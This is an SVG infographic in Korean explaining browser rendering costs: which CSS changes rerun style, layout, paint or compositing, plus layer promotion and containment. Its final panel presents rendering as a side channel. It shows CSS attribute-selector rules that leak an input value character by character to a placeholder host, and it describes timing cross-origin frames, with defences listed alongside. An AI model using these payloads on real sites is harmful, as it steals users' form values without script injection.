<svg viewBox="0 0 1000 720" xmlns="http://www.w3.org/2000/svg" font-family="Pretendard, -apple-system, 'Segoe UI', sans-serif">
  <rect x="0" y="0" width="1000" height="720" rx="12" fill="#0a0a14" stroke="#2a2a3e"/>
  <text x="500" y="34" text-anchor="middle" fill="#e8e8f0" font-size="19" font-weight="700">무엇을 바꾸면 어디부터 다시 도는가</text>
  <text x="500" y="56" text-anchor="middle" fill="#8a8aa0" font-size="12">프레임 예산은 60Hz 기준 약 16.7ms. 어느 단계부터 다시 도는지가 그 예산을 지킬 수 있는지를 결정한다.</text>

  <!-- 파이프라인 헤더 -->
  <g text-anchor="middle" font-size="10.5">
    <rect x="320" y="80" width="120" height="30" rx="5" fill="#141a22" stroke="#6f9fd8"/>
    <text x="380" y="100" fill="#bcd6f0">스타일</text>
    <rect x="450" y="80" width="120" height="30" rx="5" fill="#141a22" stroke="#6f9fd8"/>
    <text x="510" y="100" fill="#bcd6f0">레이아웃</text>
    <rect x="580" y="80" width="120" height="30" rx="5" fill="#141a22" stroke="#6f9fd8"/>
    <text x="640" y="100" fill="#bcd6f0">페인트</text>
    <rect x="710" y="80" width="120" height="30" rx="5" fill="#12201c" stroke="#34d399"/>
    <text x="770" y="100" fill="#a7f3d0">합성</text>
  </g>

  <!-- 행들 -->
  <g font-size="10.5">
    <rect x="40" y="120" width="920" height="34" rx="5" fill="#12121f" stroke="#3a3a52"/>
    <text x="58" y="142" fill="#c8c8d8">width · height · font-size · display</text>
    <text x="380" y="142" text-anchor="middle" fill="#db8585" font-weight="600">재실행</text>
    <text x="510" y="142" text-anchor="middle" fill="#db8585" font-weight="600">재실행</text>
    <text x="640" y="142" text-anchor="middle" fill="#db8585" font-weight="600">재실행</text>
    <text x="770" y="142" text-anchor="middle" fill="#db8585" font-weight="600">재실행</text>
    <text x="870" y="142" fill="#8a8aa0">가장 비싸다</text>

    <rect x="40" y="162" width="920" height="34" rx="5" fill="#12121f" stroke="#3a3a52"/>
    <text x="58" y="184" fill="#c8c8d8">color · background-color · box-shadow</text>
    <text x="380" y="184" text-anchor="middle" fill="#db8585" font-weight="600">재실행</text>
    <text x="510" y="184" text-anchor="middle" fill="#34d399">건너뜀</text>
    <text x="640" y="184" text-anchor="middle" fill="#db8585" font-weight="600">재실행</text>
    <text x="770" y="184" text-anchor="middle" fill="#db8585" font-weight="600">재실행</text>
    <text x="870" y="184" fill="#8a8aa0">기하는 그대로</text>

    <rect x="40" y="204" width="920" height="34" rx="5" fill="#12201c" stroke="#34d399"/>
    <text x="58" y="226" fill="#a7f3d0">transform · opacity (승격된 레이어에서)</text>
    <text x="380" y="226" text-anchor="middle" fill="#34d399">건너뜀</text>
    <text x="510" y="226" text-anchor="middle" fill="#34d399">건너뜀</text>
    <text x="640" y="226" text-anchor="middle" fill="#34d399">건너뜀</text>
    <text x="770" y="226" text-anchor="middle" fill="#db8585" font-weight="600">재실행</text>
    <text x="870" y="226" fill="#a7f3d0">가장 싸다</text>

    <rect x="40" y="246" width="920" height="34" rx="5" fill="#1f1a12" stroke="#e6a572"/>
    <text x="58" y="268" fill="#f0cba8">offsetHeight · getBoundingClientRect() 읽기</text>
    <text x="510" y="268" text-anchor="middle" fill="#e6a572" font-weight="600">그 자리에서 즉시 실행</text>
    <text x="800" y="268" fill="#8a8aa0">프레임 끝을 기다리지 않는다</text>
  </g>

  <!-- 레이어 승격 -->
  <rect x="40" y="300" width="450" height="170" rx="10" fill="#12121f" stroke="#3a3a52"/>
  <text x="60" y="324" fill="#e8e8f0" font-size="12" font-weight="700">레이어 승격은 공짜가 아니다</text>
  <text x="60" y="346" fill="#c8c8d8" font-size="10.5">별도 레이어가 되면 그 요소는 독립적으로 래스터되고,</text>
  <text x="60" y="362" fill="#c8c8d8" font-size="10.5">움직일 때 합성만 다시 하면 된다.</text>
  <text x="60" y="386" fill="#e6a572" font-size="10.5" font-weight="600">대가</text>
  <text x="60" y="404" fill="#8a8aa0" font-size="10.5">· 레이어마다 GPU 메모리를 따로 쓴다</text>
  <text x="60" y="422" fill="#8a8aa0" font-size="10.5">· 레이어가 많아지면 합성 자체가 병목이 된다</text>
  <text x="60" y="440" fill="#8a8aa0" font-size="10.5">· will-change 를 전역으로 뿌리면 메모리가 급증한다</text>
  <text x="60" y="460" fill="#c8c8d8" font-size="10.5">필요한 동안에만 켜고 끝나면 끄는 것이 원칙이다.</text>

  <!-- containment -->
  <rect x="510" y="300" width="450" height="170" rx="10" fill="#12121f" stroke="#3a3a52"/>
  <text x="530" y="324" fill="#e8e8f0" font-size="12" font-weight="700">무효화 범위를 좁히는 선언</text>
  <text x="530" y="346" fill="#c8c8d8" font-size="10.5">기본적으로 한 요소의 크기 변화는 형제와 조상에게</text>
  <text x="530" y="362" fill="#c8c8d8" font-size="10.5">전파된다. 그래서 리스트 한 항목이 바뀌면 전체가 흔들린다.</text>
  <text x="530" y="386" fill="#a7f3d0" font-size="10.5" font-weight="600">contain — 이 안의 변화가 밖에 영향을 주지 않는다고 선언</text>
  <text x="530" y="406" fill="#8a8aa0" font-size="10.5">브라우저는 그 약속을 믿고 재계산 범위를 그 서브트리로 가둔다</text>
  <text x="530" y="428" fill="#a7f3d0" font-size="10.5" font-weight="600">content-visibility — 화면 밖 콘텐츠의 렌더링을 건너뛴다</text>
  <text x="530" y="448" fill="#8a8aa0" font-size="10.5">긴 목록에서 효과가 크지만, 렌더 비용의 차이가 관측 가능해진다</text>
  <text x="530" y="464" fill="#8a8aa0" font-size="10.5">— 아래의 정보 채널과 이어지는 지점이다</text>

  <!-- 정보 채널 -->
  <rect x="40" y="486" width="920" height="216" rx="10" fill="#1a1420" stroke="#db8fb4"/>
  <text x="60" y="510" fill="#f0c0d8" font-size="12.5" font-weight="700">렌더링은 정보 채널이다 — 스크립트를 넣지 못해도 값이 새어 나간다</text>

  <rect x="60" y="524" width="430" height="80" rx="7" fill="#1a1012" stroke="#db8585"/>
  <text x="78" y="544" fill="#e8b0b0" font-size="11" font-weight="600">CSS 만으로 값을 한 글자씩 빼내는 경로</text>
  <text x="78" y="562" font-family="Menlo, monospace" font-size="10" fill="#c8c8d8">input[value^="a"] { background: url(//x/?a) }</text>
  <text x="78" y="578" font-family="Menlo, monospace" font-size="10" fill="#c8c8d8">input[value^="b"] { background: url(//x/?b) }</text>
  <text x="78" y="596" fill="#8a8aa0" font-size="10">일치하는 규칙만 요청을 보낸다 → 첫 글자 확정 → 다음 글자로</text>

  <rect x="510" y="524" width="430" height="80" rx="7" fill="#1a1012" stroke="#db8585"/>
  <text x="528" y="544" fill="#e8b0b0" font-size="11" font-weight="600">렌더 비용의 차이로 상태를 추정하는 경로</text>
  <text x="528" y="562" fill="#c8c8d8" font-size="10">다른 출처 페이지를 프레임에 넣고 그리는 시간을 잰다.</text>
  <text x="528" y="580" fill="#c8c8d8" font-size="10">로그인 여부·검색 결과 유무에 따라 렌더 비용이 다르면</text>
  <text x="528" y="596" fill="#c8c8d8" font-size="10">응답 내용을 읽지 않고도 상태를 구분할 수 있다.</text>

  <text x="60" y="632" fill="#c8c8d8" font-size="10.5">방어가 어려운 이유 — 이 채널들은 버그가 아니라 기능의 부산물이다. 선택자는 매칭돼야 하고, 렌더링은 내용에 따라 비용이 달라진다.</text>
  <text x="60" y="654" fill="#8a8aa0" font-size="10.5">그래서 방어는 대개 간접적이다. CSP 로 외부 자원 로딩을 제한하고, 민감한 값을 DOM 속성에 두지 않고,</text>
  <text x="60" y="672" fill="#8a8aa0" font-size="10.5">프레이밍을 거부하고(frame-ancestors), 상태별 응답의 렌더 비용 차이를 줄인다.</text>
  <text x="60" y="692" fill="#f0c0d8" font-size="10.5" font-weight="600">읽기를 막는 것과 반응의 차이를 없애는 것은 다른 작업이다. 후자를 따로 하지 않으면 남는다.</text>
</svg>
